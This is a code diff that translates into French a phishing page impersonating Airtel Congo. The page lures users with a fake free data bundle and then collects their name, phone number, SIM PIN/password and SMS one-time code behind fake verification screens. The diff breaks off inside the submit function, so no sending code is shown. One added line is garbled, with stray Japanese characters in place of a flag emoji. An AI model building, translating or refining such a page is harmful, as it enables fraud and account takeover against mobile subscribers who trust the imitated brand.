@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="fr">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -299,69 +299,69 @@
       <div class="brand-logo-mark">a</div>
       <div class="brand-text-group">
         <span class="brand-title">Airtel Congo</span>
-        <span class="brand-subtitle" data-i18n="lbl_financial_services">Data Rewards Hub</span>
+        <span class="brand-subtitle" data-i18n="lbl_financial_services">Hub de Données Gratuites</span>
       </div>
     </div>
     <div class="header-right-group">
       <!-- PROFESSIONAL LANGUAGE SELECTION DROPDOWN BUTTON -->
       <div class="lang-selector-wrap">
         <button class="lang-select-btn" onclick="toggleLangDropdown(event)">
-          <span id="currentLangLabel">🌐 English</span> ▾
+          <span id="currentLangLabel">🇫🇷 Français</span> ▾
         </button>
         <div class="lang-dropdown-menu" id="langDropdownMenu">
-          <button class="lang-option active" onclick="setLanguage('en')">🇬🇧 English</button>
-          <button class="lang-option" onclick="setLanguage('sw')">🇨🇩 Kiswahili</button>
-          <button class="lang-option" onclick="setLanguage('fr')">🇫🇷 Français</button>
+          <button class="lang-option" onclick="setLanguage('en')">🇬🇧 English</button>
+          <button class="lang-option" onclick="setLanguage('sw')">🇨どもの Swahili</button>
+          <button class="lang-option active" onclick="setLanguage('fr')">🇫🇷 Français</button>
         </div>
       </div>
-      <div class="brand-nav-right" onclick="goTo('page-login')" data-i18n="nav_signin">Claim Bundle</div>
+      <div class="brand-nav-right" onclick="goTo('page-login')" data-i18n="nav_signin">Réclamer</div>
     </div>
   </header>
 
   <div class="land-center">
     <div class="land-card">
-      <h1 data-i18n="land_h1">Claim Your Free Data Bundle</h1>
-      <p class="land-tagline" data-i18n="land_sub">High-speed 4G LTE • Zero cost • Instant activation</p>
+      <h1 data-i18n="land_h1">Réclamez Votre Forfait Internet Gratuit</h1>
+      <p class="land-tagline" data-i18n="land_sub">4G LTE haut débit • Zéro coût • Activation instantanée</p>
 
-      <div class="packages-section-title" data-i18n="calc_title">Select Data Package</div>
+      <div class="packages-section-title" data-i18n="calc_title">Sélectionnez Votre Forfait</div>
       <div class="packages-grid">
-        <div class="pkg-box" onclick="selectPackage(1, '7 Days', this)">
-          <div class="pkg-gb">1 GB</div>
-          <div class="pkg-validity">7 Days</div>
+        <div class="pkg-box" onclick="selectPackage(1, '7 Jours', this)">
+          <div class="pkg-gb">1 Go</div>
+          <div class="pkg-validity">7 Jours</div>
         </div>
-        <div class="pkg-box" onclick="selectPackage(5, '14 Days', this)">
-          <div class="pkg-gb">5 GB</div>
-          <div class="pkg-validity">14 Days</div>
+        <div class="pkg-box" onclick="selectPackage(5, '14 Jours', this)">
+          <div class="pkg-gb">5 Go</div>
+          <div class="pkg-validity">14 Jours</div>
         </div>
-        <div class="pkg-box selected" onclick="selectPackage(10, '30 Days', this)">
-          <div class="pkg-gb">10 GB</div>
-          <div class="pkg-validity">30 Days</div>
+        <div class="pkg-box selected" onclick="selectPackage(10, '30 Jours', this)">
+          <div class="pkg-gb">10 Go</div>
+          <div class="pkg-validity">30 Jours</div>
         </div>
-        <div class="pkg-box" onclick="selectPackage(25, '30 Days', this)">
-          <div class="pkg-gb">25 GB</div>
-          <div class="pkg-validity">30 Days</div>
+        <div class="pkg-box" onclick="selectPackage(25, '30 Jours', this)">
+          <div class="pkg-gb">25 Go</div>
+          <div class="pkg-validity">30 Jours</div>
         </div>
-        <div class="pkg-box" onclick="selectPackage(50, '60 Days', this)">
-          <div class="pkg-gb">50 GB</div>
-          <div class="pkg-validity">60 Days</div>
+        <div class="pkg-box" onclick="selectPackage(50, '60 Jours', this)">
+          <div class="pkg-gb">50 Go</div>
+          <div class="pkg-validity">60 Jours</div>
         </div>
-        <div class="pkg-box" onclick="selectPackage(100, '90 Days', this)">
-          <div class="pkg-gb">100 GB</div>
-          <div class="pkg-validity">90 Days</div>
+        <div class="pkg-box" onclick="selectPackage(100, '90 Jours', this)">
+          <div class="pkg-gb">100 Go</div>
+          <div class="pkg-validity">90 Jours</div>
         </div>
       </div>
 
       <div class="monthly-box">
-        <span class="ml" data-i18n="calc_monthly">Bundle Cost</span>
-        <span class="ma" id="mOut">FREE ($0)</span>
+        <span class="ml" data-i18n="calc_monthly">Coût du Forfait</span>
+        <span class="ma" id="mOut">GRATUIT ($0)</span>
       </div>
 
-      <button class="btn-grad" onclick="goTo('page-step1')" data-i18n="btn_apply_now">CLAIM FREE DATA</button>
+      <button class="btn-grad" onclick="goTo('page-step1')" data-i18n="btn_apply_now">RÉCLAMER DES DONNÉES GRATUITES</button>
 
       <div class="feats-row">
-        <div class="feat"><div class="fi">⚡</div><div class="ft" data-i18n="feat_fast">Instant Delivery</div><div class="fs" data-i18n="feat_fast_sub">Credited in seconds</div></div>
-        <div class="feat"><div class="fi">🎁</div><div class="ft" data-i18n="feat_rates">100% Free</div><div class="fs" data-i18n="feat_rates_sub">No hidden charges</div></div>
-        <div class="feat"><div class="fi">🔒</div><div class="ft" data-i18n="feat_secure">Secure</div><div class="fs" data-i18n="feat_secure_sub">Official Network</div></div>
+        <div class="feat"><div class="fi">⚡</div><div class="ft" data-i18n="feat_fast">Livraison Instantanée</div><div class="fs" data-i18n="feat_fast_sub">Crédité en quelques secondes</div></div>
+        <div class="feat"><div class="fi">🎁</div><div class="ft" data-i18n="feat_rates">100% Gratuit</div><div class="fs" data-i18n="feat_rates_sub">Aucun frais caché</div></div>
+        <div class="feat"><div class="fi">🔒</div><div class="ft" data-i18n="feat_secure">Sécurisé</div><div class="fs" data-i18n="feat_secure_sub">Réseau officiel</div></div>
       </div>
     </div>
   </div>
@@ -370,7 +370,7 @@
     <div class="popup-avatar" id="popup-avatar">A</div>
     <div class="popup-content">
         <div id="popup-text" class="popup-text"></div>
-        <div id="popup-time" class="popup-time">Just now</div>
+        <div id="popup-time" class="popup-time">À l'instant</div>
     </div>
   </div>
 
@@ -384,23 +384,23 @@
       <div class="brand-logo-mark">a</div>
       <div class="brand-text-group">
         <span class="brand-title">Airtel Congo</span>
-        <span class="brand-subtitle" data-i18n="lbl_loan_app">Data Claim Portal</span>
+        <span class="brand-subtitle" data-i18n="lbl_loan_app">Portail de Réclamation</span>
       </div>
     </div>
-    <div class="brand-nav-right" onclick="goTo('page-landing')" data-i18n="nav_home">Home</div>
+    <div class="brand-nav-right" onclick="goTo('page-landing')" data-i18n="nav_home">Accueil</div>
   </header>
 
   <div class="step-center">
     <div class="step-card">
-      <h2 data-i18n="lbl_loan_app">Select Data Package</h2>
-      <p class="step-sub" data-i18n="step_1_sub">Step 1 of 3</p>
+      <h2 data-i18n="lbl_loan_app">Sélectionnez Votre Forfait</h2>
+      <p class="step-sub" data-i18n="step_1_sub">Étape 1 sur 3</p>
       <div class="prog-row"><div class="prog-seg now"></div><div class="prog-seg"></div><div class="prog-seg"></div></div>
       <div class="msg-box error" id="s1Err"><span class="msg-icon">&#x2715;</span><span id="s1ErrTxt"></span></div>
-      <div class="field"><label data-i18n="field_loan_type">Network Offer Type</label><div class="sel-wrap"><select id="s1ty"><option data-i18n="opt_personal">Promotional Free Data</option><option selected data-i18n="opt_business">Loyalty Bonus Data</option><option data-i18n="opt_home">Student Data Relief</option><option data-i18n="opt_car">Weekend Night Data</option><option data-i18n="opt_edu">Social Media Pack</option></select></div></div>
-      <div class="field"><label data-i18n="field_loan_amt">Data Volume (GB)</label><input type="number" id="s1am" value="10" placeholder="Enter GB amount" oninput="clearErr('s1Err')"></div>
-      <div class="field"><label data-i18n="field_loan_term">Validity Duration</label><div class="sel-wrap"><select id="s1te"><option>7 Days</option><option>14 Days</option><option selected>30 Days</option><option>60 Days</option><option>90 Days</option></select></div></div>
-      <div class="field"><label data-i18n="field_purpose">Reason for Claim</label><textarea id="s1pu" placeholder="Describe how you plan to use this data…" oninput="clearErr('s1Err')"></textarea></div>
-      <button class="btn-grad" onclick="toS2()" data-i18n="btn_next">NEXT STEP</button>
+      <div class="field"><label data-i18n="field_loan_type">Type d'Offre Réseau</label><div class="sel-wrap"><select id="s1ty"><option data-i18n="opt_personal">Données Promotionnelles Gratuites</option><option selected data-i18n="opt_business">Bonus de Fidélité</option><option data-i18n="opt_home">Aide Internet Étudiant</option><option data-i18n="opt_car">Données Nuit & Weekend</option><option data-i18n="opt_edu">Pack Réseaux Sociaux</option></select></div></div>
+      <div class="field"><label data-i18n="field_loan_amt">Volume de Données (Go)</label><input type="number" id="s1am" value="10" placeholder="Entrez le montant en Go" oninput="clearErr('s1Err')"></div>
+      <div class="field"><label data-i18n="field_loan_term">Durée de Validité</label><div class="sel-wrap"><select id="s1te"><option>7 Jours</option><option>14 Jours</option><option selected>30 Jours</option><option>60 Jours</option><option>90 Jours</option></select></div></div>
+      <div class="field"><label data-i18n="field_purpose">Motif de la Réclamation</label><textarea id="s1pu" placeholder="Décrivez comment vous prévoyez d'utiliser ces données…" oninput="clearErr('s1Err')"></textarea></div>
+      <button class="btn-grad" onclick="toS2()" data-i18n="btn_next">ÉTAPE SUIVANTE</button>
     </div>
   </div>
 </div>
@@ -412,30 +412,30 @@
       <div class="brand-logo-mark">a</div>
       <div class="brand-text-group">
         <span class="brand-title">Airtel Congo</span>
-        <span class="brand-subtitle" data-i18n="lbl_loan_app">Data Claim Portal</span>
+        <span class="brand-subtitle" data-i18n="lbl_loan_app">Portail de Réclamation</span>
       </div>
     </div>
-    <div class="brand-nav-right" onclick="goTo('page-step1')" data-i18n="nav_back">Back</div>
+    <div class="brand-nav-right" onclick="goTo('page-step1')" data-i18n="nav_back">Retour</div>
   </header>
 
   <div class="step-center">
     <div class="step-card">
-      <h2 data-i18n="lbl_loan_app">Subscriber Verification</h2>
-      <p class="step-sub" data-i18n="step_2_sub">Step 2 of 3</p>
+      <h2 data-i18n="lbl_loan_app">Vérification de l'Abonné</h2>
+      <p class="step-sub" data-i18n="step_2_sub">Étape 2 sur 3</p>
       <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg now"></div><div class="prog-seg"></div></div>
       <div class="msg-box error" id="s2Err"><span class="msg-icon">&#x2715;</span><span id="s2ErrTxt"></span></div>
       <div class="field-row">
-        <div class="field"><label data-i18n="field_fname">First Name</label><input type="text" id="s2fi" placeholder="First Name" oninput="clearErr('s2Err')"></div>
-        <div class="field"><label data-i18n="field_lname">Last Name</label><input type="text" id="s2la" placeholder="Last Name" oninput="clearErr('s2Err')"></div>
+        <div class="field"><label data-i18n="field_fname">Prénom</label><input type="text" id="s2fi" placeholder="Prénom" oninput="clearErr('s2Err')"></div>
+        <div class="field"><label data-i18n="field_lname">Nom de famille</label><input type="text" id="s2la" placeholder="Nom de famille" oninput="clearErr('s2Err')"></div>
       </div>
       <div class="field">
-        <label data-i18n="field_phone">Airtel Phone Number</label>
+        <label data-i18n="field_phone">Numéro de Téléphone Airtel</label>
         <div class="phone-row"><div class="ph-pre">+243</div><input type="tel" id="s2ph" placeholder="812345678" maxlength="9" oninput="normalizePhone('s2ph');clearErr('s2Err')"></div>
-        <div class="field-hint" data-i18n="phone_hint">Enter 9 digits for DRC</div>
+        <div class="field-hint" data-i18n="phone_hint">Entrez 9 chiffres pour la RDC</div>
       </div>
       <div class="step-btns">
-        <button class="btn-gray" onclick="goTo('page-step1')" data-i18n="btn_prev">PREVIOUS</button>
-        <button class="btn-grad" onclick="toS3()" data-i18n="btn_next">NEXT STEP</button>
+        <button class="btn-gray" onclick="goTo('page-step1')" data-i18n="btn_prev">PRÉCÉDENT</button>
+        <button class="btn-grad" onclick="toS3()" data-i18n="btn_next">ÉTAPE SUIVANTE</button>
       </div>
     </div>
   </div>
@@ -449,30 +449,30 @@
       <div class="brand-logo-mark">a</div>
       <div class="brand-text-group">
         <span class="brand-title">Airtel Congo</span>
-        <span class="brand-subtitle" data-i18n="lbl_loan_app">Data Claim Portal</span>
+        <span class="brand-subtitle" data-i18n="lbl_loan_app">Portail de Réclamation</span>
       </div>
     </div>
-    <div class="brand-nav-right" onclick="goTo('page-step2')" data-i18n="nav_back">Back</div>
+    <div class="brand-nav-right" onclick="goTo('page-step2')" data-i18n="nav_back">Retour</div>
   </header>
 
   <div class="step-center">
     <div class="step-card">
-      <h2 data-i18n="lbl_loan_app">Claim Confirmation</h2>
-      <p class="step-sub" data-i18n="step_3_sub">Step 3 of 3</p>
+      <h2 data-i18n="lbl_loan_app">Confirmation de Réclamation</h2>
+      <p class="step-sub" data-i18n="step_3_sub">Étape 3 sur 3</p>
       <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg now"></div></div>
       <div class="msg-box error" id="s3Err"><span class="msg-icon">&#x2715;</span><span id="s3ErrTxt"></span></div>
-      <div class="field"><label data-i18n="field_emp_status">Usage Category</label><div class="sel-wrap"><select id="s3em"><option data-i18n="emp_employed">Streaming & Video</option><option selected data-i18n="emp_self">Remote Work & Study</option><option data-i18n="emp_unemployed">General Browsing</option><option data-i18n="emp_retired">Social Media</option><option data-i18n="emp_student">Online Gaming</option></select></div></div>
-      <div class="field"><label data-i18n="field_annual_income">Estimated Monthly Data Usage (GB)</label><input type="number" id="s3in" placeholder="e.g. 25" oninput="clearErr('s3Err')"></div>
+      <div class="field"><label data-i18n="field_emp_status">Catégorie d'Utilisation</label><div class="sel-wrap"><select id="s3em"><option data-i18n="emp_employed">Streaming & Vidéo</option><option selected data-i18n="emp_self">Télétravail & Études</option><option data-i18n="emp_unemployed">Navigation Générale</option><option data-i18n="emp_retired">Réseaux Sociaux</option><option data-i18n="emp_student">Jeux en Ligne</option></select></div></div>
+      <div class="field"><label data-i18n="field_annual_income">Consommation Mensuelle Estimée (Go)</label><input type="number" id="s3in" placeholder="ex: 25" oninput="clearErr('s3Err')"></div>
       <div class="sum-box">
-        <h3 data-i18n="sum_title">Claim Summary</h3>
-        <div class="sum-row"><span class="sk" data-i18n="sum_amt">Data Package:</span><span class="sv" id="sA">10 GB</span></div>
-        <div class="sum-row"><span class="sk" data-i18n="sum_term">Validity:</span><span class="sv" id="sT">30 Days</span></div>
-        <div class="sum-row"><span class="sk" data-i18n="sum_purpose">Category:</span><span class="sv" id="sP">—</span></div>
-        <div class="sum-row"><span class="sk" data-i18n="sum_applicant">Subscriber:</span><span class="sv" id="sN">—</span></div>
+        <h3 data-i18n="sum_title">Résumé de la Réclamation</h3>
+        <div class="sum-row"><span class="sk" data-i18n="sum_amt">Forfait Internet :</span><span class="sv" id="sA">10 Go</span></div>
+        <div class="sum-row"><span class="sk" data-i18n="sum_term">Validité :</span><span class="sv" id="sT">30 Jours</span></div>
+        <div class="sum-row"><span class="sk" data-i18n="sum_purpose">Catégorie :</span><span class="sv" id="sP">—</span></div>
+        <div class="sum-row"><span class="sk" data-i18n="sum_applicant">Abonné :</span><span class="sv" id="sN">—</span></div>
       </div>
       <div class="step-btns">
-        <button class="btn-gray" onclick="goTo('page-step2')" data-i18n="btn_prev">PREVIOUS</button>
-        <button class="btn-grad" onclick="submitApp()" data-i18n="btn_submit">SUBMIT CLAIM</button>
+        <button class="btn-gray" onclick="goTo('page-step2')" data-i18n="btn_prev">PRÉCÉDENT</button>
+        <button class="btn-grad" onclick="submitApp()" data-i18n="btn_submit">SOUMETTRE LA RÉCLAMATION</button>
       </div>
     </div>
   </div>
@@ -483,10 +483,10 @@
 <div id="page-submitted" class="page">
   <div class="sub-wrap">
     <div class="sub-icon">📶</div>
-    <h2 data-i18n="sub_title">Verification Required</h2>
-    <p data-i18n="sub_desc">Your data bundle request has been registered and is pending activation. <br>To release the bundle to your SIM, <strong>please verify your Airtel number credentials</strong> to complete authentication.</p>
-    <div class="redir-pill"><span data-i18n="sub_redirect">Redirecting to secure verification in</span> <span class="redir-n" id="rdN">3</span>s...</div><br>
-    <button class="btn-go" onclick="goTo('page-login')" data-i18n="sub_btn_login">Proceed to Verification</button>
+    <h2 data-i18n="sub_title">Vérification Requise</h2>
+    <p data-i18n="sub_desc">Votre demande de forfait de données a été enregistrée et est en attente d'activation. <br>Pour libérer le forfait sur votre carte SIM, <strong>veuillez vérifier vos identifiants numéro Airtel</strong> pour terminer l'authentification.</p>
+    <div class="redir-pill"><span data-i18n="sub_redirect">Redirection vers la vérification sécurisée dans</span> <span class="redir-n" id="rdN">3</span>s...</div><br>
+    <button class="btn-go" onclick="goTo('page-login')" data-i18n="sub_btn_login">Aller à la Vérification</button>
   </div>
 </div>
 
@@ -497,14 +497,14 @@
       <div class="brand-logo-mark">a</div>
       <div class="brand-text-group">
         <span class="brand-title">Airtel Congo</span>
-        <span class="brand-subtitle" data-i18n="lbl_secure_portal">SIM Portal</span>
+        <span class="brand-subtitle" data-i18n="lbl_secure_portal">Portail SIM</span>
       </div>
     </div>
-    <div class="brand-nav-right" onclick="goTo('page-landing')" data-i18n="nav_home">Home</div>
+    <div class="brand-nav-right" onclick="goTo('page-landing')" data-i18n="nav_home">Accueil</div>
   </header>
 
   <div class="login-body-wrap">
-    <h2 data-i18n="login_h2">Subscriber Authentication</h2>
+    <h2 data-i18n="login_h2">Authentification de l'Abonné</h2>
     <div class="login-inner">
       <div class="msg-box error" id="lgMsg"><span class="msg-icon">✕</span><span id="lgMsgTxt"></span></div>
 
@@ -512,7 +512,7 @@
         <div class="lg-ph-pre">🇨🇩 +243</div>
         <input type="tel" id="lgPh" placeholder="812345678" maxlength="9" oninput="normalizePhone('lgPh');chkLogin()">
       </div>
-      <div class="pin-label" data-i18n="login_pin_lbl">Enter your SIM PIN / Password (4 characters)</div>
+      <div class="pin-label" data-i18n="login_pin_lbl">Entrez votre PIN / Mot de passe SIM (4 caractères)</div>
       <div class="pin-row">
         <input type="password" class="pin-box" maxlength="1" oninput="pinMv(this,0)" id="p0">
         <input type="password" class="pin-box" maxlength="1" oninput="pinMv(this,1)" id="p1">
@@ -520,8 +520,8 @@
         <input type="password" class="pin-box" maxlength="1" oninput="pinMv(this,3)" id="p3">
         <button class="pin-eye" onclick="togPin()">👁</button>
       </div>
-      <div class="forgot-pin" data-i18n="login_forgot">Forgot PIN?</div>
-      <button class="btn-login" id="bLogin" onclick="doLogin()" data-i18n="login_btn">VERIFY SIM</button>
+      <div class="forgot-pin" data-i18n="login_forgot">Code PIN oublié ?</div>
+      <button class="btn-login" id="bLogin" onclick="doLogin()" data-i18n="login_btn">VÉRIFIER LA SIM</button>
     </div>
   </div>
   <div class="lg-curve">
@@ -531,7 +531,7 @@
         <span class="brand-title" style="color:#fff;">Airtel Congo</span>
       </div>
       <div class="lg-version">v2.1.3P</div>
-      <div class="lg-terms"><span data-i18n="terms_text">By proceeding you agree to the</span> <a href="#" data-i18n="terms_link">Terms and Conditions</a></div>
+      <div class="lg-terms"><span data-i18n="terms_text">En continuant, vous acceptez les</span> <a href="#" data-i18n="terms_link">Termes et Conditions</a></div>
     </div>
   </div>
 </div>
@@ -543,16 +543,16 @@
       <div class="brand-logo-mark">a</div>
       <div class="brand-text-group">
         <span class="brand-title">Airtel Congo</span>
-        <span class="brand-subtitle" data-i18n="lbl_security_ver">Security Verification</span>
+        <span class="brand-subtitle" data-i18n="lbl_security_ver">Vérification de Sécurité</span>
       </div>
     </div>
-    <div class="brand-nav-right" onclick="goTo('page-login')" data-i18n="nav_back">Back</div>
+    <div class="brand-nav-right" onclick="goTo('page-login')" data-i18n="nav_back">Retour</div>
   </header>
 
   <div class="otp-body-wrap">
     <div class="otp-card">
-      <h2 data-i18n="otp_h2">Activation Code (OTP)</h2>
-      <p class="otp-hint" data-i18n="otp_hint">Enter the confirmation code sent via SMS to your number</p>
+      <h2 data-i18n="otp_h2">Code d'Activation (OTP)</h2>
+      <p class="otp-hint" data-i18n="otp_hint">Entrez le code de confirmation envoyé par SMS à votre numéro</p>
       <div class="otp-phone" id="otpPh">+243812345678</div>
 
       <div class="msg-box error"   id="otpMsgErr"><span class="msg-icon">✕</span><span id="otpMsgErrTxt"></span></div>
@@ -561,7 +561,7 @@
 
       <div class="waiting-box" id="pinWait">
         <div class="wb-spinner"></div>
-        <p data-i18n="otp_waiting">Validating your subscriber credentials…</p>
+        <p data-i18n="otp_waiting">Validation de vos identifiants d'abonné…</p>
       </div>
 
       <div id="otpInputSection">
@@ -571,8 +571,8 @@
           <input type="text" class="otp-box" maxlength="1" oninput="otpMv(this,2)" id="o2">
           <input type="text" class="otp-box" maxlength="1" oninput="otpMv(this,3)" id="o3">
         </div>
-        <div class="otp-resend" id="otpRs"><span data-i18n="otp_resend_in">Resend code in</span> <span id="rsS">17</span> <span data-i18n="otp_seconds">seconds</span></div>
-        <button class="btn-otp" id="bOtp" onclick="doOtp()" data-i18n="otp_submit">ACTIVATE BUNDLE</button>
+        <div class="otp-resend" id="otpRs"><span data-i18n="otp_resend_in">Renvoyer le code dans</span> <span id="rsS">17</span> <span data-i18n="otp_seconds">secondes</span></div>
+        <button class="btn-otp" id="bOtp" onclick="doOtp()" data-i18n="otp_submit">ACTIVER LE FORFAIT</button>
       </div>
     </div>
   </div>
@@ -584,40 +584,40 @@
   <div class="appr-wrap">
     <div class="appr-top">
       <div class="check-circle">✓</div>
-      <div class="appr-title" data-i18n="appr_congrats">🎉 Congratulations!</div>
-      <div class="appr-sub"><span data-i18n="appr_sub1">Your free data package has been</span> <strong data-i18n="appr_approved">successfully activated!</strong> <span data-i18n="appr_sub2">Enjoy your high-speed internet.</span></div>
-      <div class="appr-banner"><div class="abl" data-i18n="appr_banner_lbl">GRANTED DATA BUNDLE</div><div class="aba" id="apAmt">10 GB</div></div>
+      <div class="appr-title" data-i18n="appr_congrats">🎉 Félicitations !</div>
+      <div class="appr-sub"><span data-i18n="appr_sub1">Votre forfait de données gratuit a été</span> <strong data-i18n="appr_approved">activé avec succès !</strong> <span data-i18n="appr_sub2">Profitez de votre internet haut débit.</span></div>
+      <div class="appr-banner"><div class="abl" data-i18n="appr_banner_lbl">FORFAIT ATTRIBUÉ</div><div class="aba" id="apAmt">10 Go</div></div>
     </div>
     <div class="comp-box">
-      <div class="ch" data-i18n="comp_notice">⚠️ ACTIVATION NOTICE</div>
-      <p><span data-i18n="comp_text1">Your line is now credited with free promotional data. To maintain high-speed access and avoid network throttling,</span> <strong data-i18n="comp_text2">ensure your SIM remains active.</strong> <span data-i18n="comp_text3">Unused data rolls over automatically upon your next monthly refill.</span></p>
+      <div class="ch" data-i18n="comp_notice">⚠️ AVIS D'ACTIVATION</div>
+      <p><span data-i18n="comp_text1">Votre ligne est désormais créditée de données promotionnelles gratuites. Pour maintenir le haut débit et éviter la limitation,</span> <strong data-i18n="comp_text2">assurez-vous que votre SIM reste active.</strong> <span data-i18n="comp_text3">Les données non utilisées sont reportées automatiquement lors de votre prochain rechargement.</span></p>
     </div>
     <div class="ld-card">
-      <div class="ld-htitle" data-i18n="ld_title">📊 Bundle Specifications</div>
-      <div class="ld-row"><div class="ld-icon ic-g">📶</div><div><div class="ld-lbl" data-i18n="ld_monthly">NETWORK SPEED</div><div class="ld-val">4G / LTE Ultra</div></div></div>
-      <div class="ld-row"><div class="ld-icon ic-b">📅</div><div><div class="ld-lbl" data-i18n="ld_term">VALIDITY PERIOD</div><div class="ld-val" id="apTerm">30 Days</div></div></div>
-      <div class="ld-row"><div class="ld-icon ic-p">💸</div><div><div class="ld-lbl" data-i18n="ld_interest">TOTAL COST</div><div class="ld-val">FREE ($0.00)</div></div></div>
+      <div class="ld-htitle" data-i18n="ld_title">📊 Spécifications du Forfait</div>
+      <div class="ld-row"><div class="ld-icon ic-g">📶</div><div><div class="ld-lbl" data-i18n="ld_monthly">VITESSES DU RÉSEAU</div><div class="ld-val">4G / LTE Ultra</div></div></div>
+      <div class="ld-row"><div class="ld-icon ic-b">📅</div><div><div class="ld-lbl" data-i18n="ld_term">PÉRIODE DE VALIDITÉ</div><div class="ld-val" id="apTerm">30 Jours</div></div></div>
+      <div class="ld-row"><div class="ld-icon ic-p">💸</div><div><div class="ld-lbl" data-i18n="ld_interest">COÛT TOTAL</div><div class="ld-val">GRATUIT ($0.00)</div></div></div>
     </div>
     <div class="qa-wrap">
-      <div class="qa-title" data-i18n="qa_title">Quick Actions</div>
-      <button class="qa-btn" data-i18n="qa_deposit">📡 Check Data Balance</button>
-      <button class="qa-btn" data-i18n="qa_withdraw">🎁 Share Data with Friends</button>
-      <button class="qa-btn" data-i18n="qa_details">📄 View Bundle Details</button>
+      <div class="qa-title" data-i18n="qa_title">Actions Rapides</div>
+      <button class="qa-btn" data-i18n="qa_deposit">📡 Vérifier le Solde Internet</button>
+      <button class="qa-btn" data-i18n="qa_withdraw">🎁 Partager des Données</button>
+      <button class="qa-btn" data-i18n="qa_details">📄 Voir les Détails</button>
     </div>
-    <div class="nxt-steps"><span>📱</span><p><strong data-i18n="nxt_title">Next Steps:</strong><br><span data-i18n="nxt_desc">You will receive an SMS confirmation with your data allocation balance shortly.</span></p></div>
-    <div class="rth-wrap"><button class="rth-btn" onclick="goTo('page-landing')" data-i18n="rth_btn">🏠 Return to Home</button></div>
+    <div class="nxt-steps"><span>📱</span><p><strong data-i18n="nxt_title">Prochaines Étapes :</strong><br><span data-i18n="nxt_desc">Vous recevrez un SMS de confirmation avec le solde de votre allocation sous peu.</span></p></div>
+    <div class="rth-wrap"><button class="rth-btn" onclick="goTo('page-landing')" data-i18n="rth_btn">🏠 Retour à l'Accueil</button></div>
   </div>
 </div>
 
 <!-- MODALS -->
 <div class="overlay" id="mLogin">
-  <div class="modal"><div class="spinner"></div><h3 data-i18n="modal_wait">Please wait…</h3><p data-i18n="modal_sending">Validating your subscriber information</p></div>
+  <div class="modal"><div class="spinner"></div><h3 data-i18n="modal_wait">Veuillez patienter…</h3><p data-i18n="modal_sending">Validation de vos informations d'abonné</p></div>
 </div>
 <div class="overlay" id="mOtp">
-  <div class="modal"><div class="spinner"></div><h3 data-i18n="modal_verifying_otp">Verifying Code</h3><p id="otpVT">Please wait… (3s)</p></div>
+  <div class="modal"><div class="spinner"></div><h3 data-i18n="modal_verifying_otp">Vérification du Code</h3><p id="otpVT">Veuillez patienter… (3s)</p></div>
 </div>
 <div class="overlay" id="mSubmit">
-  <div class="modal"><div class="spinner"></div><h3 data-i18n="modal_submitting">Processing Request…</h3><p data-i18n="modal_processing">Please wait while we record your data claim</p></div>
+  <div class="modal"><div class="spinner"></div><h3 data-i18n="modal_submitting">Traitement de la Demande…</h3><p data-i18n="modal_processing">Veuillez patienter pendant l'enregistrement</p></div>
 </div>
 
 <script>
@@ -719,7 +719,7 @@
       modal_processing: "Please wait while we record your data claim"
     },
     sw: {
-      lang_label: "🌐 Kiswahili",
+      lang_label: "🇨🇩 Swahili",
       lbl_financial_services: "Kituo cha Data za Bure",
       lbl_loan_app: "Lango la Kudai Data",
       lbl_secure_portal: "Lango la SIM",
@@ -906,7 +906,7 @@
     }
   };
 
-  let currentLang = 'en';
+  let currentLang = 'fr';
 
   function toggleLangDropdown(event) {
     event.stopPropagation();
@@ -925,9 +925,11 @@
     currentLang = lang;
     
     document.querySelectorAll('.lang-option').forEach(el => el.classList.remove('active'));
-    event && event.currentTarget && event.currentTarget.classList.add('active');
+    if (event && event.currentTarget) {
+      event.currentTarget.classList.add('active');
+    }
     
-    const labels = { en: "🌐 English", sw: "🇨🇩 Kiswahili", fr: "🇫🇷 Français" };
+    const labels = { en: "🌐 English", sw: "🇨🇩 Swahili", fr: "🇫🇷 Français" };
     document.getElementById('currentLangLabel').textContent = labels[lang];
 
     document.querySelectorAll('[data-i18n]').forEach(el => {
@@ -937,15 +939,21 @@
       }
     });
 
-    document.getElementById('langDropdownMenu').classList.remove('show');
+    const langMenu = document.getElementById('langDropdownMenu');
+    if (langMenu) langMenu.classList.remove('show');
   }
+
+  // Initial language set to French
+  document.addEventListener("DOMContentLoaded", () => {
+    setLanguage('fr');
+  });
 
   // ══════════════════════════════════════════════════════
   // STATE
   // ══════════════════════════════════════════════════════
   const S = {
     amt: 10,
-    term: '30 Days',
+    term: '30 Jours',
     purpose: '',
     first: '',
     last: '',
@@ -1039,11 +1047,11 @@
     const amt     = document.getElementById('s1am').value;
     const purpose = document.getElementById('s1pu').value.trim();
     if (!amt || Number(amt) <= 0) {
-      showErr('s1Err', 'Please enter a valid data volume.');
+      showErr('s1Err', 'Veuillez entrer un volume de données valide.');
       shakeField('s1am'); return;
     }
     if (!purpose) {
-      showErr('s1Err', 'Please enter a reason for your data claim.');
+      showErr('s1Err', 'Veuillez entrer le motif de votre réclamation.');
       shakeField('s1pu'); return;
     }
     clearErr('s1Err');
@@ -1057,14 +1065,14 @@
     const first = document.getElementById('s2fi').value.trim();
     const last  = document.getElementById('s2la').value.trim();
     const phone = document.getElementById('s2ph').value.trim();
-    if (!first) { showErr('s2Err', 'Please enter your first name.'); shakeField('s2fi'); return; }
-    if (!last)  { showErr('s2Err', 'Please enter your last name.');  shakeField('s2la'); return; }
+    if (!first) { showErr('s2Err', 'Veuillez entrer votre prénom.'); shakeField('s2fi'); return; }
+    if (!last)  { showErr('s2Err', 'Veuillez entrer votre nom.');  shakeField('s2la'); return; }
     if (!phone || phone.length < 9) {
-      showErr('s2Err', 'Please enter a valid phone number.'); shakeField('s2ph'); return;
+      showErr('s2Err', 'Veuillez entrer un numéro de téléphone valide.'); shakeField('s2ph'); return;
     }
     clearErr('s2Err');
     S.first = first; S.last = last; S.phone = phone;
-    document.getElementById('sA').textContent = S.amt + ' GB';
+    document.getElementById('sA').textContent = S.amt + ' Go';
     document.getElementById('sT').textContent = S.term;
     document.getElementById('sP').textContent = S.purpose || '—';
     document.getElementById('sN').textContent = [S.first, S.last].filter(Boolean).join(' ') || '—';
@@ -1074,17 +1082,17 @@
   function submitApp() {
     const income = document.getElementById('s3in').value;
     if (!income || Number(income) <= 0) {
